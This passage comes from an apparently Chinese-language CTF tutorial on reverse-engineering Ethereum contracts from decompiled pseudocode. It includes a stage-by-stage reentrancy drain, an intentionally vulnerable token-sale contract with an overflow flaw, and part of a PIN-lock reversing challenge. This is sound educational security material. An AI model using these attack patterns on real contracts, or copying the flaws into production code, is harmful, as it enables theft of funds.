综合分析</h4><p>总结攻击流程</p><p><strong>第一阶段</strong> 黑客调用 <code>func_01CA</code>函数，</p><p><code>func_01CA</code>函数作用：</p><p>1.向漏洞合约的 <code>depositFunds</code>函数发送 1eth</p><p>2.向漏洞合约的 <code>withdrawFunds</code>函数发出撤走 1eth 的请求</p><p><strong>第二阶段</strong> 当漏洞合约的 <code>withdrawFunds</code>函数 进入到发送金额的时候 由于使用的是 call 函数 转账，会附加”所有可用 gas”，并触发攻击合约的 fallback函数</p><p><strong>第三阶段</strong> 当攻击合约的 <code>fallback</code>函数 被触发后，首先会对漏洞合约的余额进行判断，如果大于 1eth 就重新调用漏洞合约的 <code>withdrawFunds</code>函数 ，由于<code>withdrawFunds</code>函数最后两步才会减去<code>msg.sender</code>对应的余额并记录，导致<code>fallback</code>函数发起的调用<code>withdrawFunds</code>函数的信息require判断都能通过，直到漏洞合约的余额小于等于 1eth。</p><p><strong>第四阶段</strong> 黑客调用 <code>collectEther</code>函数 取走攻击合约余额。</p><h2 id="练手1"><a href="#练手1" class="headerlink" title="练手1"></a>练手1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract Demo &#123;</span><br><span class="line">    uint256 private c;</span><br><span class="line"></span><br><span class="line">    function a() public returns (uint256) &#123; factorial(2); &#125;</span><br><span class="line">    function b() public &#123; c++; &#125;</span><br><span class="line"></span><br><span class="line">    function factorial(uint n) internal returns (uint256) &#123;</span><br><span class="line">        if (n &lt;&#x3D; 1) &#123; return 1; &#125;</span><br><span class="line"></span><br><span class="line">        return n * factorial(n - 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到的伪代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">contract Contract &#123;</span><br><span class="line">    function main() &#123;</span><br><span class="line">        memory[0x40:0x60] &#x3D; 0x80;</span><br><span class="line">    </span><br><span class="line">        if (msg.data.length &lt; 0x04) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">    </span><br><span class="line">        var var0 &#x3D; msg.data[0x00:0x20] &#x2F; 0x0100000000000000000000000000000000000000000000000000000000 &amp; 0xffffffff;</span><br><span class="line">    </span><br><span class="line">        if (var0 &#x3D;&#x3D; 0x0dbe671f) &#123;</span><br><span class="line">            &#x2F;&#x2F; Dispatch table entry for a()</span><br><span class="line">            var var1 &#x3D; msg.value;</span><br><span class="line">        </span><br><span class="line">            if (var1) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">        </span><br><span class="line">            var1 &#x3D; 0x60;</span><br><span class="line">            var1 &#x3D; a();</span><br><span class="line">            var temp0 &#x3D; memory[0x40:0x60];</span><br><span class="line">            memory[temp0:temp0 + 0x20] &#x3D; var1;</span><br><span class="line">            var temp1 &#x3D; memory[0x40:0x60];</span><br><span class="line">            return memory[temp1:temp1 + (temp0 + 0x20) - temp1];</span><br><span class="line">        &#125; else if (var0 &#x3D;&#x3D; 0x4df7e3d0) &#123;</span><br><span class="line">            &#x2F;&#x2F; Dispatch table entry for b()</span><br><span class="line">            var1 &#x3D; msg.value;</span><br><span class="line">        </span><br><span class="line">            if (var1) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">        </span><br><span class="line">            var1 &#x3D; 0x88;</span><br><span class="line">            b();</span><br><span class="line">            stop();</span><br><span class="line">        &#125; else &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function a() returns (var r0) &#123;</span><br><span class="line">        var var0 &#x3D; 0x00;</span><br><span class="line">        var var1 &#x3D; 0x94;</span><br><span class="line">        var var2 &#x3D; 0x02;</span><br><span class="line">        var1 &#x3D; func_00AB(var2);</span><br><span class="line">        return var0;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function b() &#123;</span><br><span class="line">        storage[0x00] &#x3D; storage[0x00] + 0x01;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function func_00AB(var arg0) returns (var r0) &#123;</span><br><span class="line">        var var0 &#x3D; 0x00;</span><br><span class="line">    </span><br><span class="line">        if (arg0 &gt; 0x01) &#123;</span><br><span class="line">            var var1 &#x3D; 0xc8;</span><br><span class="line">            var var2 &#x3D; arg0 - 0x01;</span><br><span class="line">            var1 &#x3D; func_00AB(var2);</span><br><span class="line">            var0 &#x3D; arg0 * var1;</span><br><span class="line">        </span><br><span class="line">        label_00CD:</span><br><span class="line">            return var0;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            var0 &#x3D; 0x01;</span><br><span class="line">            goto label_00CD;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为这个合约很简单，所以这个伪代码也不难。</p><p>开辟空间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory[0x40:0x60] &#x3D; 0x80;</span><br></pre></td></tr></table></figure><p>检查输入的的data是不是符合函数签名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (msg.data.length &lt; 0x04) &#123; revert(memory[0x00:0x00]); &#125;</span><br></pre></td></tr></table></figure><p>这里我们不需要知道内部原理，只需要知道这样得到的var0是函数4个bytes的签名即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var var0 &#x3D; msg.data[0x00:0x20] &#x2F; 0x0100000000000000000000000000000000000000000000000000000000 &amp; 0xffffffff;</span><br></pre></td></tr></table></figure><p>后面的代码都是根据var0的函数签名选择调用哪个函数</p><p>尝试着写出还原后的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract gogogo&#123;</span><br><span class="line">    function a() public returns(uint) &#123;</span><br><span class="line">        func_009E(2)</span><br><span class="line">        return 0</span><br><span class="line">    &#125;</span><br><span class="line">    function b()public &#123;</span><br><span class="line">        storage[0x00] +&#x3D; 0x01;</span><br><span class="line">        return 0;&#x2F;&#x2F;和stop()等价</span><br><span class="line">    &#125;</span><br><span class="line">    function func_009E( arg0) returns ( r0)&#123;</span><br><span class="line">        if(arg0&lt;&#x3D;1) &#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        return arg0*func_009E(arg0-1)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="练手2"><a href="#练手2" class="headerlink" title="练手2"></a>练手2</h2><p>一个有漏洞的合约</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN &#x3D; 1 ether;</span><br><span class="line">    function TokenSaleChallenge(address _player) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &lt; 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line">    function buy(uint256 numTokens) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; numTokens * PRICE_PER_TOKEN);</span><br><span class="line">        balanceOf[msg.sender] +&#x3D; numTokens;</span><br><span class="line">    &#125;</span><br><span class="line">    function sell(uint256 numTokens) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; numTokens);</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; numTokens;</span><br><span class="line">        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反编译后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">contract Contract &#123;</span><br><span class="line">    function main() &#123;</span><br><span class="line">        memory[0x40:0x60] &#x3D; 0x80;</span><br><span class="line">    </span><br><span class="line">        if (msg.data.length &lt; 0x04) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">    </span><br><span class="line">        var var0 &#x3D; msg.data[0x00:0x20] &#x2F; 0x0100000000000000000000000000000000000000000000000000000000 &amp; 0xffffffff;</span><br><span class="line">    </span><br><span class="line">        if (var0 &#x3D;&#x3D; 0x70a08231) &#123;</span><br><span class="line">            &#x2F;&#x2F; Dispatch table entry for balanceOf(address)</span><br><span class="line">            var var1 &#x3D; msg.value;</span><br><span class="line">        </span><br><span class="line">            if (var1) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">        </span><br><span class="line">            var1 &#x3D; 0x00a8;</span><br><span class="line">            var var2 &#x3D; msg.data[0x04:0x24] &amp; 0xffffffffffffffffffffffffffffffffffffffff;</span><br><span class="line">            var2 &#x3D; balanceOf(var2);</span><br><span class="line">            var temp0 &#x3D; memory[0x40:0x60];</span><br><span class="line">            memory[temp0:temp0 + 0x20] &#x3D; var2;</span><br><span class="line">            var temp1 &#x3D; memory[0x40:0x60];</span><br><span class="line">            return memory[temp1:temp1 + (temp0 + 0x20) - temp1];</span><br><span class="line">        &#125; else if (var0 &#x3D;&#x3D; 0xb2fa1c9e) &#123;</span><br><span class="line">            &#x2F;&#x2F; Dispatch table entry for isComplete()</span><br><span class="line">            var1 &#x3D; msg.value;</span><br><span class="line">        </span><br><span class="line">            if (var1) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">        </span><br><span class="line">            var1 &#x3D; 0x00d3;</span><br><span class="line">            var1 &#x3D; isComplete();</span><br><span class="line">            var temp2 &#x3D; memory[0x40:0x60];</span><br><span class="line">            memory[temp2:temp2 + 0x20] &#x3D; !!var1;</span><br><span class="line">            var temp3 &#x3D; memory[0x40:0x60];</span><br><span class="line">            return memory[temp3:temp3 + (temp2 + 0x20) - temp3];</span><br><span class="line">        &#125; else if (var0 &#x3D;&#x3D; 0xd96a094a) &#123;</span><br><span class="line">            &#x2F;&#x2F; Dispatch table entry for buy(uint256)</span><br><span class="line">            var1 &#x3D; 0x010b;</span><br><span class="line">            var2 &#x3D; msg.data[0x04:0x24];</span><br><span class="line">            buy(var2);</span><br><span class="line">            stop();</span><br><span class="line">        &#125; else if (var0 &#x3D;&#x3D; 0xe4849b32) &#123;</span><br><span class="line">            &#x2F;&#x2F; Dispatch table entry for sell(uint256)</span><br><span class="line">            var1 &#x3D; msg.value;</span><br><span class="line">        </span><br><span class="line">            if (var1) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">        </span><br><span class="line">            var1 &#x3D; 0x0138;</span><br><span class="line">            var2 &#x3D; msg.data[0x04:0x24];</span><br><span class="line">            sell(var2);</span><br><span class="line">            stop();</span><br><span class="line">        &#125; else &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function balanceOf(var arg0) returns (var arg0) &#123;</span><br><span class="line">        memory[0x20:0x40] &#x3D; 0x00;</span><br><span class="line">        memory[0x00:0x20] &#x3D; arg0;</span><br><span class="line">        return storage[keccak256(memory[0x00:0x40])];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() returns (var r0) &#123; return address(this).balance &lt; 0x0a; &#125;</span><br><span class="line">    </span><br><span class="line">    function buy(var arg0) &#123;</span><br><span class="line">        if (msg.value !&#x3D; arg0 * 0x0a) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">    </span><br><span class="line">        memory[0x00:0x20] &#x3D; msg.sender;</span><br><span class="line">        memory[0x20:0x40] &#x3D; 0x00;</span><br><span class="line">        var temp0 &#x3D; keccak256(memory[0x00:0x40]);</span><br><span class="line">        storage[temp0] &#x3D; storage[temp0] + arg0;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function sell(var arg0) &#123;</span><br><span class="line">        memory[0x00:0x20] &#x3D; msg.sender;</span><br><span class="line">        memory[0x20:0x40] &#x3D; 0x00;</span><br><span class="line">    </span><br><span class="line">        if (storage[keccak256(memory[0x00:0x40])] &lt; arg0) &#123; revert(memory[0x00:0x00]); &#125;</span><br><span class="line">    </span><br><span class="line">        var temp0 &#x3D; arg0;</span><br><span class="line">        memory[0x00:0x20] &#x3D; msg.sender;</span><br><span class="line">        memory[0x20:0x40] &#x3D; 0x00;</span><br><span class="line">        var temp1 &#x3D; keccak256(memory[0x00:0x40]);</span><br><span class="line">        storage[temp1] &#x3D; storage[temp1] - temp0;</span><br><span class="line">        var temp2 &#x3D; temp0 * 0x0a;</span><br><span class="line">        var temp3 &#x3D; memory[0x40:0x60];</span><br><span class="line">        var temp4;</span><br><span class="line">        temp4, memory[temp3:temp3 + 0x00] &#x3D; address(msg.sender).call.gas(!temp2 * 0x08fc).value(temp2)(memory[temp3:temp3 + memory[0x40:0x60] - temp3]);</span><br><span class="line">        var var0 &#x3D; !temp4;</span><br><span class="line">    </span><br><span class="line">        if (!var0) &#123; return; &#125;</span><br><span class="line">    </span><br><span class="line">        var temp5 &#x3D; returndata.length;</span><br><span class="line">        memory[0x00:0x00 + temp5] &#x3D; returndata[0x00:0x00 + temp5];</span><br><span class="line">        revert(memory[0x00:0x00 + returndata.length]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看<code>balanceOf(address)</code>,这里需要知道映射的储存方式，映射mapping 中的键 <code>k</code> 所对应的值会位于 <code>keccak256(k.p)</code>， 其中 <code>.</code> 是连接符。</p><p>通过var2在定义的时候<code>&amp; 0xffffffffffffffffffffffffffffffffffffffff</code>可以确定var2是<code>address</code>类型(160位),传入balanceOf()后可以发现返回<code>storage[keccak256(address+0x00)]</code>，从<code>+0x00</code>可以看出来这就是最开始就定义的从地址到某个类型(分析其他地方可得出)的映射。</p><p>isComplete()非常明了了，直接跳过。</p><p>buy(arg0)第一行明显要我们传入 arg0 数量的 ether 进去，这里可以还原成<code>require()</code><br>下面的代码把arg0加到上面的映射中。再结合函数名(这次运气好函数名都有)可以猜出这个合约到底要干啥了。</p><p>sell()里要注意的是 <code>memory[temp3:temp3 + 0x00] = address(temp0).call.gas(!temp4 * 0x08fc).value(temp4)(memory[temp3:temp3 + 0x00]);</code>这一行包括下面的代码都是代表一个transfer()，因为transfer要处理返回值，所以分开写看起来比较多。这里我们可以看到安全的transfer也是通过.call.value来实现的，只不过对gas做了严格控制，杜绝重入漏洞。<br>试着写一下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract gogogo&#123;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address add)public returns ()&#123;</span><br><span class="line">        return storage[keccak256(add+0x00)];</span><br><span class="line">        &#x2F;&#x2F;映射的储存方法</span><br><span class="line">        &#x2F;&#x2F;也就是 mapping(address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line">    &#125;</span><br><span class="line">    function isComplete()&#123;</span><br><span class="line">        return address(this).balance &lt; 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line">    function buy( arg0)public &#123;</span><br><span class="line">        require(msg.value&#x3D;&#x3D;arg0*1 ether);</span><br><span class="line">        mapping[msg.sender] +&#x3D; arg0;</span><br><span class="line">    &#125;</span><br><span class="line">    function sell( arg0)public&#123;</span><br><span class="line">        require(mapping[msg.sender]&gt;&#x3D;arg0)</span><br><span class="line">        mapping[msg.sender] -&#x3D;arg0;        </span><br><span class="line">        msg.sender.transfer(arg0 * 1 ehter);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后说一下，这段代码是有个溢出漏洞，在<code>require(msg.value==arg0*1 ether);</code>处，可以绕过。</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>一道没有源码的逆向题<code>The Lock</code>，已知信息:解锁这个合约就胜利，函数签名unlock(bytes4 pincode)，每次尝试支付0.5 ehter。</p><p>反编译后：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">contract Contract &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        memory[<span class="number">0x40</span>:<span class="number">0x60</span>] = <span class="number">0x60</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.data.length &lt; <span class="number">0x04</span>) &#123; revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span>]); &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> var0 = msg.data[<span class="number">0x00</span>:<span class="number">0x20</span>] / <span class="number">0x0100000000000000000000000000000000000000000000000000000000</span> &amp; <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var0 == <span class="number">0x6a5e2650</span>) &#123;</span><br><span class="line">            <span class="comment">// Dispatch table entry for unlocked()</span></span><br><span class="line">            <span class="keyword">if</span> (msg.value) &#123; revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span>]); &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> var1 = <span class="number">0x0064</span>;</span><br><span class="line">            <span class="keyword">var</span> var2 = unlocked();</span><br><span class="line">            <span class="keyword">var</span> temp0 = memory[<span class="number">0x40</span>:<span class="number">0x60</span>];</span><br><span class="line">            memory[temp0:temp0 + <span class="number">0x20</span>] = !!var2;</span><br><span class="line">            <span class="keyword">var</span> temp1 = memory[<span class="number">0x40</span>:<span class="number">0x60</span>];</span><br><span class="line">            <span class="keyword">return</span> memory[temp1:temp1 + (temp0 + <span class="number">0x20</span>) - temp1];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == <span class="number">0x75a4e3a0</span>) &#123;</span><br><span class="line">            <span class="comment">// Dispatch table entry for 0x75a4e3a0 (unknown)</span></span><br><span class="line">            <span class="comment">//unlock(bytes4)</span></span><br><span class="line">            var1 = <span class="number">0x00b3</span>;</span><br><span class="line">            var2 = msg.data[<span class="number">0x04</span>:<span class="number">0x24</span>] &amp; ~<span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span>;</span><br><span class="line">            var1 = func_00DF(var2);</span><br><span class="line">            <span class="keyword">var</span> temp2 = memory[<span class="number">0x40</span>:<span class="number">0x60</span>];</span><br><span class="line">            memory[temp2:temp2 + <span class="number">0x20</span>] = !!var1;</span><br><span class="line">            <span class="keyword">var</span> temp3 = memory[<span class="number">0x40</span>:<span class="number">0x60</span>];</span><br><span class="line">            <span class="keyword">return</span> memory[temp3:temp3 + (temp2 + <span class="number">0x20</span>) - temp3];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span>]); &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">unlocked</span>(<span class="params"></span>) <span class="title">returns</span> (<span class="params">var r0</span>) </span>&#123; <span class="keyword">return</span> storage[<span class="number">0x00</span>] &amp; <span class="number">0xff</span>; &#125;</span><br><span class="line">    <span class="comment">//unlock(bytes4 )</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func_00DF</span>(<span class="params">var arg0</span>) <span class="title">returns</span> (<span class="params">var r0</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> var0 = <span class="number">0x00</span>;</span><br><span class="line">        <span class="keyword">var</span> var1 = var0;</span><br><span class="line">        <span class="keyword">var</span> var2 = <span class="number">0x00</span>;</span><br><span class="line">        <span class="keyword">var</span> var3 = var2;</span><br><span class="line">        <span class="keyword">var</span> var4 = <span class="number">0x00</span>;</span><br><span class="line">        <span class="keyword">var</span> var5 = var4;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.value &lt; <span class="number">0x06f05b59d3b20000</span>) &#123; revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span>]); &#125;</span><br><span class="line"></span><br><span class="line">        var3 = <span class="number">0x00</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var3 &amp; <span class="number">0xff</span> &gt;= <span class="number">0x04</span>) &#123;</span><br><span class="line">        label_01A4:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var2 != var1) &#123; <span class="keyword">return</span> <span class="number">0x00</span>; &#125;</span><br><span class="line"></span><br><span class="line">            storage[<span class="number">0x00</span>] = (storage[<span class="number">0x00</span>] &amp; ~<span class="number">0xff</span>) | <span class="number">0x01</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0x01</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        label_0111:</span><br><span class="line">            <span class="keyword">var</span> var6 = arg0;</span><br><span class="line">            <span class="keyword">var</span> var7 = var3 &amp; <span class="number">0xff</span>;<span class="comment">//0x00</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var7 &gt;= <span class="number">0x04</span>) &#123; assert(); &#125;</span><br><span class="line"></span><br><span class="line">            var4 = (byte(var6, var7) * <span class="number">0x0100000000000000000000000000000000000000000000000000000000000000</span>) / <span class="number">0x0100000000000000000000000000000000000000000000000000000000000000</span>;</span><br><span class="line">            var6 = var4 &gt;= <span class="number">0x30</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!var6) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!var6) &#123;</span><br><span class="line">                label_0197:</span><br><span class="line">                    var3 = var3 + <span class="number">0x01</span>;</span><br><span class="line"></span><br><span class="line">                label_0104:</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (var3 &amp; <span class="number">0xff</span> &gt;= <span class="number">0x04</span>) &#123; goto label_01A4; &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123; goto label_0111; &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                label_0181:</span><br><span class="line">                    <span class="keyword">var</span> temp0 = var4 - <span class="number">0x30</span>;</span><br><span class="line">                    var5 = temp0;</span><br><span class="line">                    var2 = var2 + var5 ** <span class="number">0x04</span>;</span><br><span class="line">                    var1 = var1 * <span class="number">0x0a</span> + var5;</span><br><span class="line">                    var3 = var3 + <span class="number">0x01</span>;</span><br><span class="line">                    goto label_0104;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4 &gt; <span class="number">0x39</span>) &#123; goto label_0197; &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123; goto label_0181; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先修正一个错误！反编译后的<code>byte(var6, var7)</code>里两个参数的位置是错误的，<code>byte(var7, 